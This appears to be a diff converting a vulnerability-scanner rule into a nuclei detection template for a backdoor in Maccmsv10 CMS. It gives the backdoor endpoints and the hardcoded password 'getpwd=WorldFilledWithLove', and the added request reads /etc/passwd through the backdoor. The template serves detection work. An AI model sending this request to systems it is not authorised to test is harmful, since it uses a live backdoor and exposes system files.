@@ -1,19 +1,28 @@
 id: maccmsv10-backdoor
-
 info:
   name: Maccmsv10 Backdoor
-  author: FiveAourThe
+  author: princechaddha
   severity: critical
-  description: |-
-    Maccmsv10 Backdoor
-  tags: maccmsv10,backdoor
-  created: 2025/03/27
+  description: A backdoor has been found in Maccmsv10, the backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'.
+  tags: maccmsv10,rce
 
-rules:
-  r0:
-    request:
-      method: POST
-      path: /extend/Qcloud/Sms/Sms.php
-      body: getpwd=WorldFilledWithLove
-    expression: response.status == 200 && response.body.bcontains(b"扫描后门") && response.body.bcontains(b"反弹端口") && response.body.bcontains(b"文件管理")
-expression: r0()
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
+    body: "getpwd=WorldFilledWithLove"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "扫描后门"
+          - "反弹端口"
+          - "文件管理"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
